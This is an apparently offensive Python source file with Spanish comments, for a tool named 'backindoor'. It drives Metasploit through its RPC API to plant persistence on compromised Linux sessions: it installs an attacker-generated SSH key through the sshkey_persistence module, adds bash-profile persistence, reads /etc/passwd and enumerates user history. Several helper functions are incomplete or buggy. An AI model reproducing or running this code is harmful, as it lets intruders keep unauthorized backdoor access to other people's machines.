# TODO: funciones
#   - get_modules()
#   - get_sessions()
#   - set_options()
#   - create_session() Se crea como salida de la ejecucion de modulos que generen meterpreter
#   - remove_session()
#   - _

# from db import *
from pymetasploit3.msfrpc import *
import paramiko
import os


class Msf:

    def __init__(self) -> None:
        self.client = MsfRpcClient('backindoor', port=55553, ssl=True)
        # self.client = MsfRpcClient('backindoor', port=55553, ssl=False)
        # self.client = MsfRpcClient('WsNFyWBa', port=55552, ssl=False)
    
        self.msf_console_list = []


    ##################  AUX FUNCTIONS  ##################

    def get_modules(self):
        return self.client.modules.post
        

    def select_module(self, name):
        return self.client.modules.use('post', name)
    

    def get_missing_required(self, module):
        return module.missing_required


    def config_module():
        pass

    def get_sessions(self):
        if self.client.sessions.list:
            return self.client.sessions.list
        else:
            return None
        
    def get_session(self, id):
        if len(self.client.sessions.list) > 1:
            return self.client.sessions.list[id]
        else:
            return None

    def create_session():
        pass

    def remove_session():
        pass

    def ssh_key_gen(self):
        # Guardar directorio HOME del usuario
        home_dir = os.environ['HOME']
        # Generar una nueva clave SSH
        private_key = paramiko.RSAKey.generate(2048)
        # Guardar la clave privada en un archivo
        private_key.write_private_key_file(home_dir + '/.ssh/bid0_key')

        # Guardar la clave pública en un archivo
        with open(home_dir + '/.ssh/bid0_key.pub', 'w') as file:
            file.write(f'{private_key.get_name()} {private_key.get_base64()}')
    
        print('COOL: Clave SSH generada exitosamente.')

    def create_msf_console(self):
        # self.msf_console_list.append(self.client.consoles.console().cid)
        # return self.msf_console_list[-1]
        self.msf_console_list.append(self.client.consoles.console())
        return self.msf_console_list[-1]
    
    def get_msf_console(self, id_console=None):
        # Si no hay ninguna consola creada, se crea una nueva
        if len(self.msf_console_list) == 0:
            return self.create_msf_console()
        # Si hay consola creada y existe el parametro id_console, se busca y si no se encuetra, devuelve None
        elif id_console:
            for console in self.msf_console_list:
                if id_console == console.id:
                    return console
            # Si hay consola creada pero id_console no coincide , se crea una nueva
            return self.create_msf_console()
        # Si no recibe el parametro id_console, crea una nueva
        else:
            return self.create_msf_console()
            
    def clean_msf_output(self, output):
        output_split = output.split('Metasploit Documentation: https://docs.metasploit.com/')
        if len(output_split) > 1:
            return str(output_split[1:])[6:-4]


    ##################  PERSISTENCE FUNCTIONS  ##################

    def msf_ssh_key(self):
        # try:
        print(self.client.sessions.list)
        if self.client.sessions.list:
            module = self.client.modules.use('post', 'linux/manage/sshkey_persistence')
            print(module.description)
            print()
            # Listar sesiones existentes al usuario
            in1 = input('MSF Session [1] -> ').strip()
            if in1 != '' and in1 in self.client.sessions.list.keys():
                module['SESSION'] = int(in1)
            else:
                module['SESSION'] = int(list(self.client.sessions.list.keys())[0])
                print(f'-- WARM: La sesion seleccionada no existe. Seleccionando sesion {list(self.client.sessions.list.keys())[0]}')

            # Guardar lista de usuarios del propio sistema 
            console = self.get_msf_console()
            console.write('cut -d: -f1 /etc/passwd')
            user_list = self.clean_msf_output(console.read()).split('\\n')

            # TODO: EXCLUIR TODOS LOS USUARIOS DE SISTEMA

            in2 = input('Username [all] -> ').strip()
            if in2 != '' and in2 in user_list:
                module['USERNAME'] = in2

            in3 = input('Public key [new key] -> ').strip()
            if in3 != '':
                # Buscar claves SSH en directorio por defecto del usuario
                console.write('ls ${HOME}/.ssh')
                out3 = self.clean_msf_output(console.read()).split('\\n')
                out3[out3.index('config')] = None
                ssh_keys_list = out3.remove(None)
                if in3 in ssh_keys_list:
                    module['PUBKEY'] = in3
            else:
                self.ssh_key_gen()
                module['PUBKEY'] = 'bid0_key'

            in4 = input('SSHD config [~/.ssh] -> ').strip()
            if in4 != '':
                # TODO: COMPROBAR QUE ES UNA RUTA VALIDA
                module['SSHD_CONFIG'] = in4

            in5 = input('Create SSHD folder [no] -> ').strip()
            if in5 == 'yes':
                module['CREATESSHFOLDER'] = 'true'
            print()

            # msf_console_id = self.client.consoles.console().cid
            # msf_console = self.client.consoles.console(msf_console_id)
            print(console.run_module_with_output(module))
            console.destroy()
            return module['SESSION']

        else:
            print('-- HOT: Despliegue fallido. Requiere al menos una sesion MSF activa')
            return False
            
        # except:
        #     print('-- ERROR: No hay servidor RPC activo')


    def msf_bashrc(self):
        if self.client.sessions.list:
            module = self.client.modules.use('exploit', 'linux/local/bash_profile_persistence')
            print(module.description)
            print()
            in1 = input('MSF Session [1] -> ').strip()
            if in1 != '' and in1 in self.client.sessions.list.keys():
                module['SESSION'] = int(in1)
            else:
                module['SESSION'] = int(list(self.client.sessions.list.keys())[0])
                print(f'-- WARM: La sesion seleccionada no existe. Seleccionando sesion {list(self.client.sessions.list.keys())[0]}')
            print()

            console = self.get_msf_console()
            print(console.run_module_with_output(module))
            console.destroy()
            return module['SESSION']

        else:
            print('-- HOT: Despliegue fallido. Requiere al menos una sesion MSF activa')
            return False
        



    # def test_2(self):
    #     if self.client.sessions.list:
    #         module = self.client.modules.use('post', 'post/linux/gather/enum_protections')
    #         print(module.description)
    #         print()
    #         in1 = input('MSF Session [1] -> ').strip()
    #         if in1 != '' and in1 in self.client.sessions.list.keys():
    #             module['SESSION'] = int(in1)
    #         else:
    #             module['SESSION'] = int(list(self.client.sessions.list.keys())[0])
    #             print(f'-- WARM: La sesion seleccionada no existe. Seleccionando sesion {list(self.client.sessions.list.keys())[0]}')
    #         print()
    #         in2 = input('asdfasdfsa').strip()
    #             module['RHOST'] = in2

    #         console = self.get_msf_console()
    #         print(console.run_module_with_output(module))
    #         console.destroy()
    #         return module['SESSION']

        # else:
        #     print('-- HOT: Despliegue fallido. Requiere al menos una sesion MSF activa')
        #     return False

    ##################  UTILS FUNCTIONS  ##################

    def enum_users(self):
        if self.client.sessions.list:
            module = self.client.modules.use('post', 'linux/gather/enum_users_history')
            print(module.description)
            print()

            print(self.get_sessions())
            in1 = input('MSF Session [1] -> ').strip()
            if in1 != '' and in1 in self.client.sessions.list.keys():
                module['SESSION'] = int(in1)
            else:
                module['SESSION'] = int(list(self.client.sessions.list.keys())[0])
                print(f'WARM: Selected session doesnt exists. Selecting session {list(self.client.sessions.list.keys())[0]}')
            
            console = self.get_msf_console()
            console.run_module_with_output(module)
            # module.execute()


    



def get_modules(client, type):
    if type == 'post':
        client.modules.post
    elif type == 'multi':
        client.modules.multi
    elif type == 'auxiliary':
        client.modules.auxiliary
    elif type == 'payloads':
        client.modules.payloads
    elif type == 'nops':
        client.modules.nops
    elif type == 'encodeformats':
        client.modules.encodeformats
    elif type == 'encoders':
        client.modules.encoders
    elif type == 'evasion':
        client.modules.evasion
    elif type == 'platforms':
        client.modules.evasion





